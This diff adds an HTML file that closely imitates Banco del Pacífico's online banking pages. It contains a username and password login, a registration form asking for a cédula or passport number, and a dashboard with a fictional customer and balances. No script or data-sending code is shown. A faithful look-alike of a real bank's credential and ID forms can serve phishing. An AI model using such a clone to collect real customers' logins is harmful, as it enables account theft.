@@ -1,0 +1,1934 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Banco del Pacífico</title>
+  <!-- Google Fonts: Inter -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+  <link rel="icon" type="image/png" href="logo2.png">
+</head>
+
+<body>
+  <div id="app">
+    <!-- VIEW 1: LOGIN -->
+    <div id="login-view" class="view active">
+      <div class="login-container">
+        <!-- Columna Izquierda: Formulario -->
+        <div class="login-left">
+          <div class="login-left-content">
+            <!-- Logo Banco del Pacífico -->
+            <div class="brand-logo">
+              <img class="logo-icon" src="logo2.png" alt="Banco del Pacífico Logo">
+              <span class="brand-name">Banco del Pacífico</span>
+            </div>
+
+            <!-- Tarjeta de Login -->
+            <!-- Tarjeta de Login -->
+            <div class="login-card">
+              <h2 class="login-title">Bienvenido</h2>
+
+              <!-- Mensaje de Error de Login -->
+              <div id="login-error-message" class="login-error hidden"></div>
+
+              <!-- Paso 1: Ingreso de Usuario -->
+              <form id="login-step-username" onsubmit="goToPasswordStep(event)">
+                <div class="input-group">
+                  <label for="username" id="username-label">Ingresa tu usuario</label>
+                  <input type="text" id="username" autocomplete="off" required oninput="validateUsername()">
+                </div>
+
+                <button type="submit" id="btn-continue" class="btn btn-primary" disabled>Continuar</button>
+
+                <!-- Sub-cuadrícula de opciones inferiores (solo paso 1) -->
+                <div class="login-footer-actions">
+                  <div class="footer-action-box" onclick="goToRegister(event)">
+                    <svg class="action-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                      <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
+                      <circle cx="12" cy="7" r="4" />
+                    </svg>
+                    <span>Crear usuario y contraseña</span>
+                  </div>
+                  <div class="footer-action-box">
+                    <svg class="action-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                      <rect x="2" y="5" width="20" height="14" rx="2" />
+                      <line x1="2" y1="10" x2="22" y2="10" />
+                      <circle cx="7" cy="15" r="1.5" />
+                    </svg>
+                    <span>Solicitar productos</span>
+                  </div>
+                </div>
+              </form>
+
+              <!-- Paso 2: Ingreso de Clave (Oculto por defecto) -->
+              <form id="login-step-password" class="hidden" onsubmit="handleLogin(event)">
+                <button type="button" class="back-login-btn" onclick="backToUsernameStep(event)" title="Regresar">
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                    <line x1="19" y1="12" x2="5" y2="12" />
+                    <polyline points="12 19 5 12 12 5" />
+                  </svg>
+                </button>
+
+                <div class="security-image-container">
+                  <div class="security-avatar">
+                    <svg class="rabbit-svg" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                      <rect width="100" height="100" fill="#f8fafc" rx="16" />
+
+                      <!-- Ears -->
+                      <ellipse cx="40" cy="32" rx="7" ry="20" fill="#ffffff" stroke="#4a5568" stroke-width="3.5"
+                        transform="rotate(-8 40 32)" />
+                      <ellipse cx="40" cy="34" rx="3.5" ry="13" fill="#ffd1d1" />
+
+                      <ellipse cx="60" cy="32" rx="7" ry="20" fill="#ffffff" stroke="#4a5568" stroke-width="3.5"
+                        transform="rotate(8 60 32)" />
+                      <ellipse cx="60" cy="34" rx="3.5" ry="13" fill="#ffd1d1" />
+
+                      <!-- Body/Shirt -->
+                      <path d="M 22,85 C 22,70 32,68 50,68 C 68,68 78,70 78,85 Z" fill="#1a1a1a" stroke="#4a5568"
+                        stroke-width="3.5" />
+                      <path d="M 45,74 L 50,78 L 55,74" fill="none" stroke="white" stroke-width="2.5" />
+
+                      <!-- Head -->
+                      <ellipse cx="50" cy="56" rx="22" ry="18" fill="#ffffff" stroke="#4a5568" stroke-width="3.5" />
+
+                      <!-- Eyes -->
+                      <circle cx="41" cy="54" r="3" fill="#1a1a1a" />
+                      <circle cx="59" cy="54" r="3" fill="#1a1a1a" />
+                      <circle cx="42.5" cy="52.5" r="1" fill="#ffffff" />
+                      <circle cx="60.5" cy="52.5" r="1" fill="#ffffff" />
+
+                      <!-- Nose & Mouth -->
+                      <polygon points="50,60 47,57 53,57" fill="#ff8b8b" />
+                      <path d="M 47,63 C 49,65 50,65 50,63 C 50,65 51,65 53,63" fill="none" stroke="#4a5568"
+                        stroke-width="2.5" stroke-linecap="round" />
+
+                      <!-- Cheeks -->
+                      <circle cx="34" cy="60" r="3" fill="#ffcccc" />
+                      <circle cx="66" cy="60" r="3" fill="#ffcccc" />
+                    </svg>
+                  </div>
+                  <span class="security-keyword">MAGIA</span>
+                </div>
+
+                <div class="input-group password-group">
+                  <label for="password" id="password-label">Ingresa tu contraseña</label>
+                  <input type="password" id="password" autocomplete="off" required oninput="validatePassword()">
+                  <button type="button" class="toggle-password-btn" onclick="togglePasswordVisibility()"
+                    title="Mostrar/ocultar contraseña">
+                    <svg class="eye-icon hidden-eye" id="password-eye-hidden" viewBox="0 0 24 24" fill="none"
+                      stroke="currentColor" stroke-width="2">
+                      <path
+                        d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
+                      <line x1="1" y1="1" x2="23" y2="23" />
+                    </svg>
+                    <svg class="eye-icon visible-eye hidden" id="password-eye-visible" viewBox="0 0 24 24" fill="none"
+                      stroke="currentColor" stroke-width="2">
+                      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
+                      <circle cx="12" cy="12" r="3" />
+                    </svg>
+                  </button>
+                </div>
+
+                <button type="submit" id="btn-login" class="btn btn-primary" disabled>Iniciar sesión</button>
+              </form>
+
+              <button class="btn btn-secondary">Desbloquear usuario</button>
+              <a href="#" class="forgot-link">¿Olvidaste tu contraseña?</a>
+            </div>
+
+            <!-- Navegadores sugeridos y Copyright -->
+            <div class="login-browsers-info">
+              <p>Recomendamos utilizar la Banca Virtual con los navegadores Chrome 36.0.1, Firefox 31.0, Microsoft Edge.
+              </p>
+              <p class="copyright">© Copyright 2017 Banco del Pacífico *V5.4.0</p>
+            </div>
+          </div>
+        </div>
+
+        <!-- Columna Derecha: Consejos de Seguridad -->
+        <div class="login-right">
+          <div class="security-content">
+            <span class="security-subtitle">CONSEJOS</span>
+            <h3 class="security-title">Por tu seguridad:</h3>
+
+            <div class="tips-list">
+              <!-- Consejo 1 -->
+              <div class="tip-item">
+                <div class="tip-icon-container">
+                  <svg class="tip-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+                  </svg>
+                </div>
+                <p class="tip-text">Banco del Pacífico S.A. no solicita claves, usuarios, números de tarjetas o cuenta
+                  por ningún medio.</p>
+              </div>
+
+              <!-- Consejo 2 -->
+              <div class="tip-item">
+                <div class="tip-icon-container">
+                  <svg class="tip-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path
+                      d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4" />
+                  </svg>
+                </div>
+                <p class="tip-text">No compartas tus claves, recuerda que son de uso personal e intransferible.</p>
+              </div>
+
+              <!-- Consejo 3 -->
+              <div class="tip-item">
+                <div class="tip-icon-container">
+                  <svg class="tip-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <circle cx="12" cy="12" r="10" />
+                    <line x1="12" y1="8" x2="12" y2="12" />
+                    <line x1="12" y1="16" x2="12.01" y2="16" />
+                  </svg>
+                </div>
+                <p class="tip-text">Para acceder a la Banca Virtual, asegúrese de teclear en tu navegador la dirección
+                  <a href="https://www.intermatico.com" target="_blank">https://www.intermatico.com</a>
+                </p>
+              </div>
+
+              <!-- Consejo 4 -->
+              <div class="tip-item">
+                <div class="tip-icon-container">
+                  <svg class="tip-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path
+                      d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z" />
+                  </svg>
+                </div>
+                <p class="tip-text">En caso recibir llamadas, mensajes texto o correos sospechosos contáctate
+                  inmediatamente al 3731500 opción 9.</p>
+              </div>
+            </div>
+
+            <!-- Ayuda -->
+            <div class="help-section">
+              <h4 class="help-title">¿Necesitas ayuda?</h4>
+              <ul class="help-list">
+                <li><a href="#">¿Cómo creo mi usuario?</a></li>
+                <li><a href="#">¿Cómo desbloqueo mi usuario?</a></li>
+                <li><a href="#">¿Cómo recupero mi contraseña?</a></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- VIEW 3: REGISTER -->
+    <div id="register-view" class="view hidden">
+      <!-- Barra superior / Header -->
+      <header class="navbar">
+        <div class="navbar-left">
+          <div class="brand-logo white-logo">
+            <img class="logo-icon" src="logo.png" alt="Banco del Pacífico Logo">
+            <span class="brand-name">Banco del Pacífico</span>
+          </div>
+        </div>
+      </header>
+
+      <!-- Contenedor de Registro -->
+      <div class="register-container">
+        <div class="register-card">
+          <h2 class="register-title">Registro</h2>
+
+          <!-- Barra de progreso -->
+          <div class="register-steps">
+            <div class="step-item active">
+              <span>1. Identificación del cliente</span>
+              <div class="step-line"></div>
+            </div>
+            <div class="step-item">
+              <span>2. Validación de cliente</span>
+              <div class="step-line"></div>
+            </div>
+            <div class="step-item">
+              <span>3. Usuario y Contraseña</span>
+              <div class="step-line"></div>
+            </div>
+            <div class="step-item">
+              <span>4. Confirmación de datos</span>
+              <div class="step-line"></div>
+            </div>
+            <div class="step-item">
+              <span>5. Registro finalizado</span>
+              <div class="step-line"></div>
+            </div>
+          </div>
+
+          <p class="register-info-text">Aquí puede contratar el canal y crear su usuario de BdP.</p>
+
+          <!-- Formulario Grid de dos columnas -->
+          <form id="register-form" onsubmit="event.preventDefault();">
+            <div class="register-form-grid">
+              <!-- Datos (Columna Izquierda e Inputs en Derecha) -->
+              <div class="register-grid-left">
+                <h3 class="register-section-title">Datos</h3>
+                <p class="register-section-desc">Identifícate ingresando tu número de cédula o pasaporte.</p>
+              </div>
+              <div class="register-grid-right">
+                <div class="register-field">
+                  <label for="reg-id-type">Tipo de identificación</label>
+                  <div class="register-input-wrapper">
+                    <select id="reg-id-type" required onchange="validateRegisterForm()">
+                      <option value="" disabled selected>Seleccione el tipo de identificación</option>
+                      <option value="cedula">Cédula</option>
+                      <option value="pasaporte">Pasaporte</option>
+                    </select>
+                    <span class="asterisk">*</span>
+                  </div>
+                </div>
+
+                <div class="register-field">
+                  <label for="reg-id-number">Número de identificación</label>
+                  <div class="register-input-wrapper">
+                    <input type="text" id="reg-id-number" placeholder="Ingrese el Número de identificación" required
+                      oninput="validateRegisterForm()">
+                    <span class="asterisk">*</span>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Términos y condiciones -->
+              <div class="register-grid-left">
+                <h3 class="register-section-title">Términos y condiciones</h3>
+              </div>
+              <div class="register-grid-right">
+                <div class="terms-container">
+                  TÉRMINOS Y CONDICIONES USO DE CANALES DIGITALES DE BDP El cliente, en uso de sus facultades legales,
+                  declara que conoce, acepta y autoriza lo siguiente: 1.- Los canales digitales de BdP son los medios a
+                  través de los cuales se atienden a los clientes de Banco del Pacífico que solicitan el(los)
+                  producto(s) o (los) servicio(s) financiero(s) y/o aquellos mecanismos a través de los cuales se hace
+                  efectiva la contraprestación de los servicios aceptados, y pagados cuando corresponda, por sus
+                  clientes. 2.- El uso de los canales digitales de BdP consiste en permitir al Cliente el
+                  establecimiento de una comunicación vía internet en el primer caso, y vía teléfono...
+                </div>
+
+                <div class="terms-accept-row">
+                  <input type="checkbox" id="reg-terms-check" onchange="validateRegisterForm()">
+                  <label for="reg-terms-check" id="reg-terms-label">Declaro haber leído los términos y
+                    condiciones</label>
+                </div>
+
+                <div class="required-notice">*Campos obligatorios</div>
+              </div>
+            </div>
+
+            <!-- Botones en la parte inferior de la tarjeta -->
+            <div class="register-buttons-row">
+              <button type="button" class="btn-register-outline" onclick="backToLogin(event)">Cancelar</button>
+              <button type="submit" id="btn-register-submit" class="btn-register-primary" disabled>Siguiente</button>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <!-- VIEW 2: DESKTOP/ESCRITORIO -->
+    <div id="dashboard-view" class="view hidden">
+      <!-- Navbar superior -->
+      <header class="navbar">
+        <div class="navbar-left">
+          <div class="brand-logo white-logo">
+            <img class="logo-icon" src="logo.png" alt="Banco del Pacífico Logo">
+            <span class="brand-name">Banco del Pacífico</span>
+          </div>
+        </div>
+        <div class="navbar-right">
+          <!-- Botón Notificaciones -->
+          <div class="nav-icon-btn notifications-btn">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" />
+              <path d="M13.73 21a2 2 0 0 1-3.46 0" />
+            </svg>
+            <span class="badge">2</span>
+          </div>
+
+          <!-- Botón Perfil Contenedor Relativo -->
+          <div class="profile-container">
+            <div class="profile-btn" onclick="toggleProfileMenu(event)">
+              <div class="profile-avatar">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                  <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
+                  <circle cx="12" cy="7" r="4" />
+                </svg>
+              </div>
+              <span id="profile-name">Perfil</span>
+            </div>
+
+            <!-- Menú Desplegable del Perfil (Oculto por defecto) -->
+            <div id="profile-dropdown" class="profile-dropdown-menu hidden">
+              <div class="dropdown-header">
+                <h4 id="dropdown-user-name">Francisco Vázquez</h4>
+                <p class="last-connection" id="dropdown-last-connection">Última conexión 2026-07-07 01:08 PM</p>
+                <button class="dropdown-logout-btn" onclick="openLogoutConfirmModal()">
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4" />
+                    <polyline points="16 17 21 12 16 7" />
+                    <line x1="21" y1="12" x2="9" y2="12" />
+                  </svg>
+                  <span>Cerrar sesión</span>
+                </button>
+              </div>
+              <div class="dropdown-body-links">
+                <a href="#" class="dropdown-link-item">Actualizar mis datos</a>
+                <a href="#" class="dropdown-link-item">Configuración de cuenta</a>
+                <a href="#" class="dropdown-link-item">Mis estadísticas</a>
+                <a href="#" class="dropdown-link-item badge-item">
+                  <span>Pacífico Informa</span>
+                  <span class="dropdown-badge badge-active">ACTIVA</span>
+                </a>
+                <a href="#" class="dropdown-link-item">Reclamos</a>
+                <a href="#" class="dropdown-link-item badge-item">
+                  <span>Personalizar mi inicio</span>
+                  <span class="dropdown-badge badge-new">NUEVO</span>
+                </a>
+                <a href="#" class="dropdown-link-item">Califícanos</a>
+                <a href="#" class="dropdown-link-item">Contáctenos</a>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </header>
+
+      <!-- Layout Principal del Escritorio -->
+      <div class="dashboard-body">
+        <!-- Sidebar lateral izquierdo -->
+        <aside class="sidebar">
+          <!-- Buscador -->
+          <div class="sidebar-search">
+            <div class="search-input-wrapper">
+              <svg class="search-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <circle cx="11" cy="11" r="8" />
+                <line x1="21" y1="21" x2="16.65" y2="16.65" />
+              </svg>
+              <input type="text" id="sidebar-search-input" placeholder="Buscar" oninput="filterFavorites()">
+            </div>
+          </div>
+
+          <!-- Menú de navegación -->
+          <nav class="sidebar-menu">
+            <a href="#" id="menu-item-inicio" class="menu-item active" onclick="backToDashboard(event)">
+              <svg class="menu-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" />
+                <polyline points="9 22 9 12 15 12 15 22" />
+              </svg>
+              <span>Inicio</span>
+            </a>
+            <div class="menu-item-group">
+              <a href="#" id="menu-item-enviar" class="menu-item" onclick="toggleSubmenu(event, 'enviar-submenu')">
+                <svg class="menu-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                  <line x1="22" y1="2" x2="11" y2="13" />
+                  <polygon points="22 2 15 22 11 13 2 9 22 2" />
+                </svg>
+                <span>Enviar</span>
+                <svg class="chevron-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                  <polyline points="9 18 15 12 9 6" />
+                </svg>
+              </a>
+              <div id="enviar-submenu" class="submenu-container collapsed">
+                <a href="#" id="submenu-item-a-cuenta" class="submenu-item" onclick="goToEnviarCuenta(event)">A una
+                  cuenta</a>
+                <a href="#" id="submenu-item-exterior" class="submenu-item" onclick="goToEnviarExterior(event)">A una
+                  cuenta del exterior</a>
+                <a href="#" id="submenu-item-celular" class="submenu-item" onclick="goToEnviarCelular(event)">Envío por
+                  celular</a>
+                <a href="#" id="submenu-item-retiro" class="submenu-item" onclick="goToRetiroSinTarjeta(event)">Retiro
+                  sin tarjeta</a>
+                <a href="#" id="submenu-item-regalo" class="submenu-item" onclick="goToEnviarRegalo(event)">Envío de
+                  regalo</a>
+                <a href="#" id="submenu-item-masivo" class="submenu-item" onclick="goToEnviarMasivo(event)">Envío
+                  Masivo</a>
+              </div>
+            </div>
+            <a href="#" id="menu-item-pagar" class="menu-item" onclick="goToPagar(event)">
+              <svg class="menu-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <line x1="12" y1="1" x2="12" y2="23" />
+                <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" />
+              </svg>
+              <span>Pagar</span>
+            </a>
+            <div class="menu-item-group">
+              <a href="#" class="menu-item" onclick="toggleSubmenu(event, 'solicitar-submenu')">
+                <svg class="menu-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                  <rect x="2" y="3" width="20" height="14" rx="2" ry="2" />
+                  <line x1="2" y1="10" x2="22" y2="10" />
+                  <path d="M8 21h8" />
+                  <line x1="12" y1="17" x2="12" y2="21" />
+                </svg>
+                <span>Solicitar</span>
+                <svg class="chevron-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                  <polyline points="9 18 15 12 9 6" />
+                </svg>
+              </a>
+              <div id="solicitar-submenu" class="submenu-container collapsed">
+                <a href="#" class="submenu-item has-chevron">
+                  <span>Cuentas</span>
+                  <svg class="submenu-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                    <polyline points="9 18 15 12 9 6" />
+                  </svg>
+                </a>
+                <a href="#" class="submenu-item has-chevron">
+                  <span>Tarjetas</span>
+                  <svg class="submenu-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                    <polyline points="9 18 15 12 9 6" />
+                  </svg>
+                </a>
+                <a href="#" class="submenu-item has-chevron">
+                  <span>Créditos</span>
+                  <svg class="submenu-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                    <polyline points="9 18 15 12 9 6" />
+                  </svg>
+                </a>
+                <a href="#" class="submenu-item has-chevron">
+                  <span>Servicios Bancarios</span>
+                  <svg class="submenu-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                    <polyline points="9 18 15 12 9 6" />
+                  </svg>
+                </a>
+              </div>
+            </div>
+            <a href="#" id="menu-item-invertir" class="menu-item" onclick="goToInvertir(event)">
+              <svg class="menu-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
+                <path d="M6 12a6 6 0 0 1 12 0v8a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2v-8z" />
+                <path d="M3 6h18a1 1 0 0 1 1 1v2a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V7a1 1 0 0 1 1-1z" />
+                <path d="M10 6V4a2 2 0 0 1 2-2h0a2 2 0 0 1 2 2v2" />
+              </svg>
+              <span>Invertir</span>
+            </a>
+          </nav>
+        </aside>
+
+        <!-- Contenido principal -->
+        <main class="main-content" id="dashboard-main-content">
+          <!-- Banner promocional -->
+          <div class="promo-banner"
+            style="background-image: linear-gradient(90deg, rgba(2, 43, 91, 0.9) 0%, rgba(2, 43, 91, 0.4) 50%, rgba(0, 96, 182, 0.1) 100%), url('assets/banner_advisor.png');">
+            <div class="promo-banner-content">
+              <div class="promo-text-section">
+                <h2>Conoce quién<br>es tu <span>Asesor Bancario</span></h2>
+                <div class="promo-cta">
+                  <span>Hazlo desde aquí</span>
+                  <div class="circle-arrow-btn">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                      <polyline points="9 18 15 12 9 6" />
+                    </svg>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Sección de Cuentas (Grid de Tarjetas) -->
+          <div class="accounts-grid">
+            <!-- Cuenta de Ahorros -->
+            <div class="account-card" onclick="handleCardClick(event, this)">
+              <div class="card-header">
+                <div class="card-title-group">
+                  <h3>Cuenta de ahorros</h3>
+                  <p class="account-number">1071501339</p>
+                </div>
+                <div class="card-icon blue-circle-dollar">
+                  <span>$</span>
+                </div>
+              </div>
+              <div class="card-balance-body">
+                <span class="balance-label">Saldo disponible</span>
+                <div class="balance-row">
+                  <span class="balance-value" id="savings-balance" data-value="$20,468.32">$**.**</span>
+                  <button class="toggle-balance-btn" onclick="toggleBalance(this)">
+                    <svg class="eye-icon id-eye-hidden" id="savings-eye-hidden" viewBox="0 0 24 24" fill="none"
+                      stroke="currentColor" stroke-width="2">
+                      <path
+                        d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
+                      <line x1="1" y1="1" x2="23" y2="23" />
+                    </svg>
+                    <svg class="eye-icon id-eye-visible hidden" id="savings-eye-visible" viewBox="0 0 24 24" fill="none"
+                      stroke="currentColor" stroke-width="2">
+                      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
+                      <circle cx="12" cy="12" r="3" />
+                    </svg>
+                  </button>
+                </div>
+              </div>
+              <div class="card-footer">
+                <span class="footer-label">Saldo total: </span>
+                <span class="footer-value" id="savings-total" data-value="$20,468.32">$**.**</span>
+              </div>
+            </div>
+
+            <!-- Depósito A Plaza Taza Fija -->
+            <div class="account-card" onclick="handleCardClick(event, this)">
+              <div class="card-header">
+                <div class="card-title-group">
+                  <h3>Depósito A Plaza Taza Fija</h3>
+                  <p class="account-number">262821089</p>
+                </div>
+                <div class="card-icon blue-circle-dollar">
+                  <span>$</span>
+                </div>
+              </div>
+              <div class="card-balance-body">
+                <span class="balance-label">Valor</span>
+                <div class="balance-row">
+                  <span class="balance-value" id="savings-balance" data-value="$500,000.00">$**.**</span>
+                  <button class="toggle-balance-btn" onclick="toggleBalance(this)">
+                    <svg class="eye-icon id-eye-hidden" id="savings-eye-hidden" viewBox="0 0 24 24" fill="none"
+                      stroke="currentColor" stroke-width="2">
+                      <path
+                        d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
+                      <line x1="1" y1="1" x2="23" y2="23" />
+                    </svg>
+                    <svg class="eye-icon id-eye-visible hidden" id="savings-eye-visible" viewBox="0 0 24 24" fill="none"
+                      stroke="currentColor" stroke-width="2">
+                      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
+                      <circle cx="12" cy="12" r="3" />
+                    </svg>
+                  </button>
+                </div>
+              </div>
+              <div class="card-footer">
+                <span class="footer-label expiry-label" data-expiry="2027-04-12" data-date-str="12 abr 2027"
+                  data-rate="5.35" data-term="361" data-value="500,000.00" onclick="triggerInvestmentModal(this)">Vence
+                  en
+                  275 días(12 abr 2027)</span>
+              </div>
+            </div>
+
+            <!-- Depósito A Plazo Taza Fija -->
+            <div class="account-card" onclick="handleCardClick(event, this)">
+              <div class="card-header">
+                <div class="card-title-group">
+                  <h3>Depósito A Plaza Taza Fija</h3>
+                  <p class="account-number">262821089</p>
+                </div>
+                <div class="card-icon blue-circle-dollar">
+                  <span>$</span>
+                </div>
+              </div>
+              <div class="card-balance-body">
+                <span class="balance-label">Valor</span>
+                <div class="balance-row">
+                  <span class="balance-value" id="savings-balance" data-value="$100,000.00">$**.**</span>
+                  <button class="toggle-balance-btn" onclick="toggleBalance(this)">
+                    <svg class="eye-icon id-eye-hidden" id="savings-eye-hidden" viewBox="0 0 24 24" fill="none"
+                      stroke="currentColor" stroke-width="2">
+                      <path
+                        d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
+                      <line x1="1" y1="1" x2="23" y2="23" />
+                    </svg>
+                    <svg class="eye-icon id-eye-visible hidden" id="savings-eye-visible" viewBox="0 0 24 24" fill="none"
+                      stroke="currentColor" stroke-width="2">
+                      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
+                      <circle cx="12" cy="12" r="3" />
+                    </svg>
+                  </button>
+                </div>
+              </div>
+              <div class="card-footer">
+                <span class="footer-label expiry-label" data-expiry="2026-07-30" data-date-str="30 jul 2026"
+                  data-rate="5.35" data-term="30" data-value="100,000.00" onclick="triggerInvestmentModal(this)">Vence
+                  en
+                  275 días(30 jul 2026)</span>
+              </div>
+            </div>
+          </div>
+
+        </main>
+
+        <!-- Vista Detalles de Cuenta (Saldos y Movimientos) -->
+        <main class="main-content hidden" id="savings-detail-content">
+          <div class="detail-header-row">
+            <button class="back-to-dashboard-btn" onclick="backToDashboard()">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                <line x1="19" y1="12" x2="5" y2="12" />
+                <polyline points="12 19 5 12 12 5" />
+              </svg>
+            </button>
+            <h2 class="detail-title">Saldos y movimientos</h2>
+            <div style="width: 40px;"></div>
+          </div>
+
+          <div class="detail-account-card">
+            <p class="detail-card-type" id="detail-card-title">CUENTA DE AHORROS — 1071501339</p>
+            <p class="detail-card-label">Saldo disponible</p>
+            <h1 class="detail-card-balance" id="detail-card-balance-val">$20,468.32</h1>
+            <p class="detail-card-total">Saldo total: <span id="detail-card-total-val">$20,468.32</span></p>
+            <div class="detail-card-actions">
+              <button class="btn-qr">
+                <svg class="qr-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                  <rect x="3" y="3" width="7" height="7" />
+                  <rect x="14" y="3" width="7" height="7" />
+                  <rect x="14" y="14" width="7" height="7" />
+                  <rect x="3" y="14" width="7" height="7" />
+                  <path d="M7 17h.01M17 17h.01M17 7h.01" />
+                </svg>
+                <span>Ver código QR</span>
+              </button>
+            </div>
+            <button class="btn-account-details-link">Ver detalles de la cuenta</button>
+          </div>
+
+          <div class="detail-quick-actions">
+            <button class="quick-action-btn">
+              <svg class="quick-action-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
+                <polyline points="14 2 14 8 20 8" />
+                <line x1="16" y1="13" x2="8" y2="13" />
+                <line x1="16" y1="17" x2="8" y2="17" />
+                <polyline points="10 9 9 9 8 9" />
+              </svg>
+              <span>Certificados</span>
+            </button>
+            <button class="quick-action-btn">
+              <svg class="quick-action-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <rect x="3" y="4" width="18" height="16" rx="2" />
+                <line x1="16" y1="2" x2="16" y2="6" />
+                <line x1="8" y1="2" x2="8" y2="6" />
+                <line x1="3" y1="10" x2="21" y2="10" />
+              </svg>
+              <span>Comprobantes</span>
+            </button>
+            <button class="quick-action-btn">
+              <svg class="quick-action-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <rect x="3" y="3" width="7" height="7" />
+                <rect x="14" y="3" width="7" height="7" />
+                <rect x="14" y="14" width="7" height="7" />
+                <rect x="3" y="14" width="7" height="7" />
+              </svg>
+              <span>Otras opciones</span>
+            </button>
